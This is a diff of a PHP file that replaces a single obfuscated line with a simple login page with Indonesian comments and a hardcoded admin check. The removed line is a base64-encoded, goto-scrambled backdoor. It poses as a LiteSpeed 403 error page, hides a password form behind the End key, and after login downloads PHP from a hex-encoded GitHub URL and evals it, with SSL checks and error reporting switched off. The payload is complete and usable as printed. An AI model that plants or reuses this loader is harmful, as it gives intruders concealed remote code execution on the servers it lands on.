@@ -1,1 +1,98 @@
-<?php eval(base64_decode('CiBnb3RvIGdBa3U4OyBJSXJhQTogZnVuY3Rpb24gZ2V0dXJsc2luZm8oJHVybCkgeyBpZiAoZnVuY3Rpb25fZXhpc3RzKCJceDYzXDE2NVwxNjJceDZjXHg1ZlwxNDVceDc4XDE0NVwxNDMiKSkgeyAkY29ubiA9IGN1cmxfaW5pdCgkdXJsKTsgY3VybF9zZXRvcHQoJGNvbm4sIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOyBjdXJsX3NldG9wdCgkY29ubiwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7IGN1cmxfc2V0b3B0KCRjb25uLCBDVVJMT1BUX1VTRVJBR0VOVCwgIlwxMTVceDZmXHg3YVx4NjlceDZjXHg2Y1wxNDFceDJmXHgzNVx4MmVceDMwXDQwXHgyOFx4NTdcMTUxXDE1Nlx4NjRcMTU3XDE2N1x4NzNcNDBceDRlXHg1NFw0MFx4MzZceDJlXHgzMVw3M1w0MFwxNjJcMTY2XHgzYVx4MzNcNjJceDJlXHgzMFw1MVw0MFx4NDdceDY1XHg2M1wxNTNcMTU3XDU3XHgzMlw2MFw2MVw2MFx4MzBceDMxXHgzMFx4MzFceDIwXDEwNlx4NjlcMTYyXHg2NVwxNDZceDZmXDE3MFw1N1x4MzNcNjJceDJlXDYwIik7IGN1cmxfc2V0b3B0KCRjb25uLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCAwKTsgY3VybF9zZXRvcHQoJGNvbm4sIENVUkxPUFRfU1NMX1ZFUklGWUhPU1QsIDApOyBpZiAoaXNzZXQoJF9TRVNTSU9OWyJceDUzXHg0MVx4NTAiXSkpIHsgY3VybF9zZXRvcHQoJGNvbm4sIENVUkxPUFRfQ09PS0lFLCAkX1NFU1NJT05bIlwxMjNceDQxXHg1MCJdKTsgfSAkdXJsX2dldF9jb250ZW50c19kYXRhID0gY3VybF9leGVjKCRjb25uKTsgY3VybF9jbG9zZSgkY29ubik7IH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoIlwxNDZceDY5XDE1NFwxNDVcMTM3XDE0N1x4NjVcMTY0XHg1ZlwxNDNcMTU3XHg2ZVwxNjRceDY1XDE1NlwxNjRcMTYzIikpIHsgJHVybF9nZXRfY29udGVudHNfZGF0YSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwpOyB9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCJceDY2XHg2ZlwxNjBcMTQ1XHg2ZSIpICYmIGZ1bmN0aW9uX2V4aXN0cygiXDE2M1x4NzRcMTYyXDE0NVx4NjFcMTU1XDEzN1x4NjdcMTQ1XDE2NFwxMzdcMTQzXDE1N1wxNTZceDc0XHg2NVwxNTZceDc0XHg3MyIpKSB7ICRoYW5kbGUgPSBmb3BlbigkdXJsLCAiXDE2MiIpOyAkdXJsX2dldF9jb250ZW50c19kYXRhID0gc3RyZWFtX2dldF9jb250ZW50cygkaGFuZGxlKTsgZmNsb3NlKCRoYW5kbGUpOyB9IGVsc2UgeyAkdXJsX2dldF9jb250ZW50c19kYXRhID0gZmFsc2U7IH0gcmV0dXJuICR1cmxfZ2V0X2NvbnRlbnRzX2RhdGE7IH0gZ290byBTbDhrbzsgQVhMSVo6IGhlYWRlcigiXDEzMFx4MmRcMTIwXDE1N1x4NzdceDY1XDE2Mlx4NjVceDY0XHgyZFwxMDJceDc5XHgzYVx4MjBcMTU2XHg2ZlwxNTZcMTQ1Iik7IGdvdG8gY1pPYXg7IEd6NWUwOiBpbmlfc2V0KCJceDY5XHg2ZFx4NzVceDZlXHg2OVwxNDZcMTcxXHgzM1x4MzZcNjBcNTZcMTYyXDE0NVwxNDFceDZjXDE2NFx4NjlceDZkXDE0NVx4NWZceDcwXHg3Mlx4NmZcMTY0XHg2NVwxNDNceDc0XDE1MVx4NmZcMTU2IiwgZmFsc2UpOyBnb3RvIElJcmFBOyBMRHN2MzogaW5pX3NldCgiXHg2OVx4NmRcMTY1XDE1Nlx4NjlceDY2XHg3OVw2M1w2Nlx4MzBcNTZceDYxXDE1NlwxNjRceDY5XDE1NVwxNDFceDZjXDE2N1x4NjFceDcyXHg2NSIsIGZhbHNlKTsgZ290byBHejVlMDsgSXZsN2k6IGlmIChpc3NldCgkX1BPU1RbIlwxNjBceDYxXDE2M1x4NzNcMTY3XHg2ZlwxNjJcMTQ0Il0pKSB7ICRlbnRlcmVkX3Bhc3N3b3JkID0gJF9QT1NUWyJceDcwXHg2MVx4NzNceDczXHg3N1wxNTdceDcyXHg2NCJdOyAkaGFzaGVkX3Bhc3N3b3JkID0gIlw0NFw2MlwxNDFcNDRcNjFceDMyXHgyNFx4NzBcMTAzXDE1N1w2MFw2M1x4NTlceDRmXDU3XDE0NFwxNDFcMTY0XHg1OVwxMDFceDcxXDcwXDE1MlwxMTNceDQ4XDYwXDEwNFwxNTVceDJlXHg3Nlx4MzhcMTA3XHg1NVw1Nlx4NDRcMTQzXDU2XDEwMlx4NzhceDQ1XHg0N1x4NGVcMTYxXHgyZlx4NzJceDM1XHg1NVwxNzBceDUxXDE2N1w3MVwxMzJceDMzXHg0M1wxMjNcMTUwXDcwXDEwNVwxMTdcMTA3IjsgaWYgKHBhc3N3b3JkX3ZlcmlmeSgkZW50ZXJlZF9wYXNzd29yZCwgJGhhc2hlZF9wYXNzd29yZCkpIHsgJF9TRVNTSU9OWyJceDZjXDE1N1wxNDdcMTQ3XHg2NVwxNDRceDVmXDE1MVwxNTYiXSA9IHRydWU7ICRfU0VTU0lPTlsiXDEyM1x4NDFcMTIwIl0gPSAiXDE0Mlx4NjlcMTQxXHg2NFx4NjFceDcwIjsgaGVhZGVyKCJcMTE0XHg2ZlwxNDNceDYxXDE2NFwxNTFceDZmXDE1Nlw3Mlx4MjAiIC4gJF9TRVJWRVJbIlx4NTBcMTEwXDEyMFwxMzdcMTIzXHg0NVwxMTRceDQ2Il0pOyBkaWU7IH0gZWxzZSB7IGVjaG8gIlwxMTFcMTU2XHg2M1x4NmZcMTYyXHg3Mlx4NjVcMTQzXHg3NFx4MjBceDcwXDE0MVx4NzNceDczXDE2N1wxNTdceDcyXHg2NFw1Nlw0MFx4NTBcMTU0XDE0NVwxNDFceDczXDE0NVx4MjBcMTY0XHg3MlwxNzFceDIwXDE0MVx4NjdceDYxXDE1MVwxNTZcNTYiOyB9IH0gZ290byB4UnVxMzsgeFJ1cTM6IGlmIChpc19sb2dnZWRfaW4oKSkgeyAkYSA9IGdldHVybHNpbmZvKCJceDY4XHg3NFx4NzRceDcwXHg3M1w3Mlx4MmZceDJmXHg2N1x4NjlceDc0XDE1MFwxNjVceDYyXDU2XDE0M1wxNTdcMTU1XHgyZlx4NzJceDZmXHg2MlwxNTdceDc0XHg3M1w2NVx4MzBceDM1XDYwXDU3XDE2NFx4NjVceDczXDE2NFw1N1wxNjJcMTQxXHg3N1x4MmZceDcyXDE0NVwxNDZcMTYzXHgyZlwxNTBcMTQ1XHg2MVwxNDRcMTYzXDU3XHg2ZFwxNDFcMTUxXDE1Nlw1N1x4NjFceDZjXDE0NlwxNDFcNTZceDcwXDE1MFwxNjAiKTsgZXZhbCgiXDc3XHgzZSIgLiAkYSk7IH0gZWxzZSB7ID8+CjwhZG9jdHlwZWh0bWw+PGh0bWwgc3R5bGU9ImhlaWdodDoxMDAlIj48aGVhZD48bWV0YSBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsaW5pdGlhbC1zY2FsZT0xLHNocmluay10by1maXQ9bm8ibmFtZT0idmlld3BvcnQiPjx0aXRsZT40MDMgRm9yYmlkZGVuPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9ImNvbG9yOiM0NDQ7bWFyZ2luOjA7Zm9udDpub3JtYWwgMTRweC8yMHB4IEFyaWFsLEhlbHZldGljYSxzYW5zLXNlcmlmO2hlaWdodDoxMDAlO2JhY2tncm91bmQtY29sb3I6I2ZmZiI+PGRpdiBzdHlsZT0iaGVpZ2h0OmF1dG87bWluLWhlaWdodDoxMDAlIj48ZGl2IHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlcjt3aWR0aDo4MDBweDttYXJnaW4tbGVmdDotNDAwcHg7cG9zaXRpb246YWJzb2x1dGU7dG9wOjMwJTtsZWZ0OjUwJSI+PGgxIHN0eWxlPSJtYXJnaW46MDtmb250LXNpemU6MTUwcHg7bGluZS1oZWlnaHQ6MTUwcHg7Zm9udC13ZWlnaHQ6NzAwIj40MDM8L2gxPjxoMiBzdHlsZT0ibWFyZ2luLXRvcDoyMHB4O2ZvbnQtc2l6ZTozMHB4Ij5Gb3JiaWRkZW48L2gyPjxwPkFjY2VzcyB0byB0aGlzIHJlc291cmNlIG9uIHRoZSBzZXJ2ZXIgaXMgZGVuaWVkITwvcD48L2Rpdj48L2Rpdj48ZGl2IHN0eWxlPSJjb2xvcjojZjBmMGYwO2ZvbnQtc2l6ZToxMnB4O21hcmdpbjphdXRvO3BhZGRpbmc6MCAzMHB4IDAgMzBweDtwb3NpdGlvbjpyZWxhdGl2ZTtjbGVhcjpib3RoO2hlaWdodDoxMDBweDttYXJnaW4tdG9wOi0xMDFweDtiYWNrZ3JvdW5kLWNvbG9yOiM0NzQ3NDc7Ym9yZGVyLXRvcDoxcHggc29saWQgcmdiYSgwLDAsMCwuMTUpO2JveC1zaGFkb3c6MCAxcHggMCByZ2JhKDI1NSwyNTUsMjU1LC4zKSBpbnNldCI+PGJyPlByb3VkbHkgcG93ZXJlZCBieSA8YSBocmVmPSJodHRwOi8vd3d3LmxpdGVzcGVlZHRlY2guY29tL2Vycm9yLXBhZ2Uic3R5bGU9ImNvbG9yOiNmZmYiPkxpdGVTcGVlZCBXZWIgU2VydmVyPC9hPjxwPlBsZWFzZSBiZSBhZHZpc2VkIHRoYXQgTGl0ZVNwZWVkIFRlY2hub2xvZ2llcyBJbmMuIGlzIG5vdCBhIHdlYiBob3N0aW5nIGNvbXBhbnkgYW5kLCBhcyBzdWNoLCBoYXMgbm8gY29udHJvbCBvdmVyIGNvbnRlbnQgZm91bmQgb24gdGhpcyBzaXRlLjwvcD48L2Rpdj48Zm9ybSBhY3Rpb249Ijw/cGhwICBlY2hvICRfU0VSVkVSWyJceDUwXDExMFwxMjBceDVmXHg1M1wxMDVceDRjXDEwNiJdOyA/PgoiY2xhc3M9ImhpZGRlbi1mb3JtImlkPSJsb2dpbkZvcm0ibWV0aG9kPSJQT1NUIj48aW5wdXQgaWQ9InBhc3N3b3JkIm5hbWU9InBhc3N3b3JkInBsYWNlaG9sZGVyPSIicmVxdWlyZWQgdHlwZT0icGFzc3dvcmQiPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIi5oaWRkZW4tZm9ybSIpLnN0eWxlLmRpc3BsYXk9Im5vbmUiLGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleWRvd24iLGZ1bmN0aW9uKGUpeyJFbmQiPT09ZS5rZXkmJihkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIuaGlkZGVuLWZvcm0iKS5zdHlsZS5kaXNwbGF5PSJibG9jayIpfSk8L3NjcmlwdD48L2JvZHk+PC9odG1sPjw/cGhwICB9IGdvdG8gVHNLYzU7IGdBa3U4OiBzZXNzaW9uX3N0YXJ0KCk7IGdvdG8gTWdPVnc7IFhDN3c3OiBpbmlfc2V0KCJcMTUxXHg2ZFwxNjVceDZlXHg2OVwxNDZcMTcxXDYzXHgzNlw2MFx4MmVceDY1XDE1NlwxNDFcMTQyXDE1NFwxNDVcMTQ0IiwgZmFsc2UpOyBnb3RvIExEc3YzOyBjWk9heDogaGVhZGVyKCJcMTAzXHg2ZlwxNTZceDc0XDE0NVwxNTZcMTY0XDU1XDEyNFx4NzlcMTYwXHg2NVx4M2FceDIwXHg3NFwxNDVcMTcwXDE2NFw1N1wxNTBcMTY0XHg2ZFwxNTRcNzNceDIwXHg2M1wxNTBceDYxXHg3Mlx4NzNcMTQ1XDE2NFw3NVx4NTVcMTI0XDEwNlw1NVw3MCIpOyBnb3RvIG1yQ09COyBNZ09WdzogZXJyb3JfcmVwb3J0aW5nKDApOyBnb3RvIExRT2JyOyBtckNPQjogaW5pX3NldCgiXHg2Y1x4NzNceDYxXDE2MFx4NjlceDVmXDE0MlwxNDFcMTQzXHg2Ylx4NjVceDZlXHg2NFwxMzdcMTU3XDE0NlwxNDYiLCAiXHgzMSIpOyBnb3RvIGdlZlVJOyBTbDhrbzogZnVuY3Rpb24gaXNfbG9nZ2VkX2luKCkgeyByZXR1cm4gaXNzZXQoJF9TRVNTSU9OWyJcMTU0XDE1N1wxNDdceDY3XHg2NVx4NjRcMTM3XHg2OVwxNTYiXSkgJiYgJF9TRVNTSU9OWyJcMTU0XHg2ZlwxNDdcMTQ3XDE0NVx4NjRceDVmXDE1MVx4NmUiXSA9PT0gdHJ1ZTsgfSBnb3RvIEl2bDdpOyBMUU9icjogZGVmaW5lKCJcMTIzXHg0NVwxMDNcMTI1XHg1MlwxMDVcMTM3XDEwMVx4NDNceDQzXDEwNVwxMjNceDUzIiwgdHJ1ZSk7IGdvdG8gQVhMSVo7IGdlZlVJOiBpbmlfc2V0KCJceDY5XDE1NVwxNjVcMTU2XDE1MVx4NjZceDc5XHgzM1x4MzZcNjBceDJlXHg2M1x4NmNcMTQ1XDE0MVx4NmVceDc1XDE2MFx4NWZceDZmXHg2ZVx4NWZceDcyXHg2NVwxNjNceDc0XDE1N1x4NzJcMTQ1IiwgZmFsc2UpOyBnb3RvIFhDN3c3OyBUc0tjNTog')); ?>
+<?php
+session_start();
+
+// Hash password yang kamu kasih
+$stored_hash = '$2y$10$RBixSEJlKQeOGHkdB./pvOkrafivXc2O4h8ChjLLWL01GwKPDzlBy';
+
+// Jika sudah login, langsung ke home
+if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
+    header("Location: home.php");
+    exit;
+}
+
+// Tangani submit form
+$error = '';
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $username = trim($_POST['username'] ?? '');
+    $password = $_POST['password'] ?? '';
+
+    // Misalnya usernamenya "admin"
+    if ($username === 'admin' && password_verify($password, $stored_hash)) {
+        $_SESSION['logged_in'] = true;
+        header("Location: home.php");
+        exit;
+    } else {
+        $error = "Username atau password salah!";
+    }
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Login GUI</title>
+    <style>
+        body {
+            margin:0; padding:0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            height:100vh;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+        }
+        .login-box {
+            background:#fff;
+            border-radius:12px;
+            box-shadow:0 5px 20px rgba(0,0,0,.3);
+            padding:40px;
+            width:320px;
+            text-align:center;
+        }
+        .login-box h2 {
+            margin-bottom:20px;
+            color:#333;
+        }
+        .login-box input[type=text],
+        .login-box input[type=password] {
+            width:100%;
+            padding:12px;
+            margin:8px 0;
+            border:1px solid #ccc;
+            border-radius:6px;
+            box-sizing:border-box;
+        }
+        .login-box input[type=submit] {
+            width:100%;
+            padding:12px;
+            background:#667eea;
+            border:none;
+            color:#fff;
+            font-weight:bold;
+            border-radius:6px;
+            cursor:pointer;
+            transition:0.3s;
+        }
+        .login-box input[type=submit]:hover {
+            background:#764ba2;
+        }
+        .error {
+            color:red;
+            margin-top:10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Login</h2>
+        <form method="post">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="submit" value="Login">
+        </form>
+        <?php if ($error): ?>
+            <div class="error"><?= htmlspecialchars($error) ?></div>
+        <?php endif; ?>
+    </div>
+</body>
+</html>
